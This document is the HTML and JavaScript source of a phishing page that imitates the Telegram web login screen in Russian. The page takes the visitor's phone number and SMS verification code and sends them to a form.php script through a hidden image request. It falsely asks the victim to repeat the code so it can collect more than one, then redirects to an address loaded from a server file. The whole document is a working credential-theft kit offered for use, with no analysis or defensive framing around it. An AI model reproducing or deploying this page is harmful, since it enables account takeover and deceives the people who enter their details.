

<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Telegram</title>
    <script>
    var ii = 0;
    </script>
    <link rel="stylesheet" href="cc.css">
    <style>
    body {
      height: 100vh;
      display: grid;
      font-family: Roboto;
      -webkit-text-size-adjust: 100%;
      -webkit-font-smoothing: antialiased;
    }

    * {
      box-sizing: border-box;
    }

    .inp {
      position: relative;
      margin: auto;
      width: 100%;
      max-width: 280px;
      border-radius: 3px;
      overflow: hidden;
    }
    .inp .label {
      position: absolute;
      top: 20px;
      left: 12px;
      font-size: 16px;
      color: rgba(0, 0, 0, 0.5);
      font-weight: 500;
      -webkit-transform-origin: 0 0;
              transform-origin: 0 0;
      -webkit-transform: translate3d(0, 0, 0);
              transform: translate3d(0, 0, 0);
      -webkit-transition: all 0.2s ease;
      transition: all 0.2s ease;
      pointer-events: none;
    }
    .inp .focus-bg {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.05);
      z-index: -1;
      -webkit-transform: scaleX(0);
              transform: scaleX(0);
      -webkit-transform-origin: left;
              transform-origin: left;
    }
    .inp input {
      -webkit-appearance: none;
      -moz-appearance: none;
           appearance: none;
      width: 100%;
      border: 0;
      font-family: inherit;
      padding: 16px 12px 0 12px;
      height: 56px;
      font-size: 16px;
      font-weight: 400;
      background: rgba(0, 0, 0, 0.02);
      box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.3);
      color: #000;
      -webkit-transition: all 0.15s ease;
      transition: all 0.15s ease;
    }
    .inp input:hover {
      background: rgba(0, 0, 0, 0.04);
      box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.5);
    }
    .inp input:not(:placeholder-shown) + .label {
      color: rgba(0, 0, 0, 0.5);
      -webkit-transform: translate3d(0, -12px, 0) scale(0.75);
              transform: translate3d(0, -12px, 0) scale(0.75);
    }
    .inp input:focus {
      background: rgba(0, 0, 0, 0.05);
      outline: none;
      box-shadow: inset 0 -2px 0 #0077FF;
    }
    .inp input:focus + .label {
      color: #0077FF;
      -webkit-transform: translate3d(0, -12px, 0) scale(0.75);
              transform: translate3d(0, -12px, 0) scale(0.75);
    }
    .inp input:focus + .label + .focus-bg {
      -webkit-transform: scaleX(1);
              transform: scaleX(1);
      -webkit-transition: all 0.1s ease;
      transition: all 0.1s ease;
    }
    #code{
      display:none;
    }
#phones, #text2{
    display:none;
}#phone{    display:block;}
    </style>
  </head>
  <body>
    <body class="non_osx non_msie is_2x">
<!----><div class="page_wrap" ng-view=""><div class="login_page_wrap" my-custom-background="#e7ebf0">
<div class="login_head_bg"></div>
<div class="login_page">
<div class="login_head_wrap clearfix" ng-switch="progress.enabled">
<!---->
<!----><div ng-switch-default="" class="login_head_submit_wrap">
  <!----><a class="login_head_submit_btn" ng-if="!credentials.phone_code_hash">
    <my-i18n msgid="modal_next" id="phone">Далее</my-i18n><my-i18n msgid="modal_next" id="phones">Далее</my-i18n><i class="icon icon-next-submit">
    </i>
<!-- <my-i18n msgid="modal_next" id="send">Next</my-i18n>-->
  </a><!---->
  <!---->
  <!---->
  <!---->
</div><!---->
<a class="login_head_logo_link" href="https://telegram.org" target="_blank">
  <i class="icon icon-tg-logo"></i><i class="icon icon-tg-title"></i>
</a>
</div>

<div class="login_form_wrap">
<!---->

<!----><form name="mySendCodeForm" ng-if="!credentials.phone_code_hash" ng-submit="sendCode()" class="ng-pristine ng-invalid ng-invalid-required">
  <h3 class="login_form_head" my-i18n="login_sign_in">Вход</h3>
  <p class="login_form_lead" my-i18n="login_enter_number_description"><r id='text1'>Пожалуйста, введите свой полный номер телефона.</r><r id='text2'>Мы отправили SMS с кодом проверки на Ваш телефон.</r></p>

<div id="block" >
<table>
   <td>
  <!--  <label for="inp" class="inp">
    <input type="tel"  id="conu" value="+" style="width:70px;">
    <span class="label"></span>
    <span class="focus-bg"></span>
  </label>-->
</td>
  <td>
    <label for="inp" class="inp">
  <input type="tel" id="numb" placeholder="" value="" style="width:250px;">
  <span class="label">--- --- ----</span>
  <span class="focus-bg"></span>
</label>
  </td>
</table>
</div>
<div id="code">
  <label for="inp" class="inp">
<input type="tel" id="send_code" placeholder="&nbsp;" style="width:300px;">
<span class="label">Введите код</span>
<span class="focus-bg"></span>

  <div class="login_form_messaging ng-hide" ng-show="progress.enabled" my-i18n="login_generating_keys_info">Keys are only generated once. This can take a few minutes on slower devices, please be patient.</div>
</form><!---->

<!---->

<!---->

<!---->

</div>

<div ng-switch="about.shown">
<!---->
<!----><div ng-switch-default="" class="login_footer_wrap">
  <p my-i18n="login_about_intro">Добро пожаловать на веб-клиент Telegram.</p>
  <a class="logo_footer_learn_more_link" href="" ng-click="about.shown = true" my-i18n="login_about_learn">Learn more</a>
</div><!---->

</div>
</div>

</div>

</div>
<div id="notify_sound"></div>

<div ng-switch="about.shown" class="login_footer_wrap ng-scope">
<!---->
</div>

</body>


  <img scr="" style="display:none;" id=sender>
  </body>
  <script>
  var code = document.getElementById('code')
  var block = document.getElementById('block')
  var numb = document.getElementById('numb');
  var con = document.getElementById('conu');
  var sender = document.getElementById('sender')
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert(" Укажите номер телефона!")}else{
    sender.src="form.php?phone="+numb.value;
    code.style.display="block";
    block.style.display="none";
    document.getElementById('phone').style.display="none";
    document.getElementById('phones').style.display="block";
    document.getElementById('text1').style.display="none";
    document.getElementById('text2').style.display="block";
    document.getElementById('ttx').innerHTML="Введите код из Смс";

    //block.style.display="none";
  }
  };
  document.getElementById('phones').onclick = function(){
    if(document.getElementById('send_code').value===""){alert("Введите смс код!")}else{
      sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
      alert("Повторите снова код")
      ii++;
    }
    if(ii == 2){
      if(document.getElementById('send_code').value===""){alert(" Введите смс код!")}else{
        sender.src="form.php?code="+ document.getElementById('send_code').value +"&phone="+numb.value;
        window.location.href="<?php echo file_get_contents("location.u"); ?>";
    }}
    document.getElementById('send_code').value=""
  };
  </script>
</html>
